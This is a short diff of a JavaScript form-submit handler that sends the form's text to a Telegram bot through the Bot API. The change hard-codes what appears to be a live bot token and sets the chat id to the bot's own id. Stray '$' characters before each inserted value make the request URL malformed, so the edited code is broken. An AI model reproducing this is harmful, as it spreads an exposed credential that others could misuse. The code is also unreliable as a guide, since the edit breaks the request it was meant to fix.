@@ -13,5 +13,5 @@ document.getElementById("telegramForm").addEventListener("submit", (e) => {
   `;
 
   // Send to Telegram (with Markdown formatting)
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+  fetch(`https://api.telegram.org/bot$8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y/sendMessage?chat_id=$8101442954&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
 });
